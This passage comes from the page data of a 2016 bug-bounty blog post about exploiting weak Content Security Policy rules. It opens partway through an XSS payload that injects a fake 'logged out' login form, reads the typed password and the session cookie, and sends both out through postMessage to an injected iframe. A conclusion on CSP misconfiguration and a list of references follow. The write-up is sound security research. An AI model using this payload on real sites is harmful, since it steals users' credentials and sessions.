class=\"token punctuation\">'</span></span><span class=\"token attr-name\">;t</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">'</span>You have been logged out. Please login below to access your account.<span class=\"token punctuation\">'</span></span><span class=\"token attr-name\">;b.type</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">'</span>text/javascript<span class=\"token punctuation\">'</span></span><span class=\"token attr-name\">;document.body.appendChild(f);fi</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span>document.getElementById(</span><span class=\"token attr-name\">'myframe').contentWindow;b.appendChild(document.createTextNode('form.onsubmit</span> <span class=\"token attr-value\"><span class=\"token punctuation\">=</span> function()</span> <span class=\"token attr-name\">{pw</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span>document.getElementById(\\</span><span class=\"token attr-name\">'mypw\\').value;c</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span>document.cookie;data</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span>{\\</span><span class=\"token attr-name\"><span class=\"token namespace\">'cookie\\':</span><span class=\"token namespace\">c,\\'pw\\':</span>pw};fi.postMessage(JSON.stringify(data),\\'*\\');}'));le</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span>document.getElementsByClassName(</span><span class=\"token attr-name\">'left</span> <span class=\"token attr-name\"><span class=\"token namespace\">pane')[0];le.setAttribute('style','display:</span>none');ri</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span>document.getElementsByClassName(</span><span class=\"token attr-name\">'right</span> <span class=\"token attr-name\"><span class=\"token namespace\">pane')[0];ri.setAttribute('style','display:</span>none');c</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span>document.getElementsByClassName(</span><span class=\"token attr-name\"><span class=\"token namespace\">'cancelButton')[0];c.setAttribute('style','display:</span>none');a.appendChild(b);m</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span>document.getElementsByClassName(</span><span class=\"token attr-name\">'create</span> <span class=\"token attr-name\">modelimg')[0];m.</span><span class=\"token style-attr language-css\"><span class=\"token attr-name\"><span class=\"token attr-name\">style</span></span><span class=\"token punctuation\">='</span><span class=\"token attr-value\"><span class=\"token property\">overflow</span><span class=\"token punctuation\">:</span>hidden<span class=\"token punctuation\">;</span></span><span class=\"token punctuation\">'</span></span><span class=\"token attr-name\">;m.appendChild(div);div.innerHTML</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span>t;div.appendChild(form);</span><span class=\"token attr-name\">\"</span><span class=\"token punctuation\">/></span></span></code></pre></div>\n<h2 id=\"conclusion\"><a href=\"#conclusion\" aria-label=\"conclusion permalink\" class=\"anchor\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Conclusion</h2>\n<p>While CSP is a great tool to limit the attack surface for potential attackers, it must be configured properly otherwise you might as well not use it. As shown in this article, the website I was looking for bugs on did use CSP however because of three policy directives which allowed inline javascript, iframes and images to be loaded from anywhere I could successfully mount an attack against any user of the site. This shows how important it is to be aware of the security models you deploy as a developer.</p>\n<h4 id=\"references\"><a href=\"#references\" aria-label=\"references permalink\" class=\"anchor\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>References</h4>\n<ul>\n<li><a href=\"http://www.html5rocks.com/en/tutorials/security/content-security-policy/\">http://www.html5rocks.com/en/tutorials/security/content-security-policy/</a></li>\n<li><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage\">https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage</a></li>\n<li><a href=\"https://speakerdeck.com/mikispag/making-csp-great-again-michele-spagnuolo-and-lukas-weichselbaum\">https://speakerdeck.com/mikispag/making-csp-great-again-michele-spagnuolo-and-lukas-weichselbaum</a></li>\n</ul>","timeToRead":7,"excerpt":"This article is based on my findings during a bug bounty. I was looking for any input bugs which could trigger a XSS but didn't find anyâ€¦","frontmatter":{"title":"Exploiting weak Content Security Policy (CSP) rules for fun and profit","slug":"exploiting-weak-content-security-policy-csp-rules-for-fun-and-profit","date":"2016-07-21T00:00:00.000Z","categories":["Bug Bounty","Web Application Security"],"tags":["Bug Bounty","Web Application Security"],"template":"post"},"fields":{"nextTitle":"Creating SYN flood attacks with Python","nextSlug":"/creating-syn-flood-attacks-with-python/","prevTitle":"SEC-T CTF - Confusion Writeup","prevSlug":"/sec-t-ctf-confusion-writeup/","slug":"/exploiting-weak-content-security-policy-csp-rules-for-fun-and-profit/","date":"2016-07-21T00:00:00.000Z"}}},"pageContext":{"slug":"/exploiting-weak-content-security-policy-csp-rules-for-fun-and-profit/"}}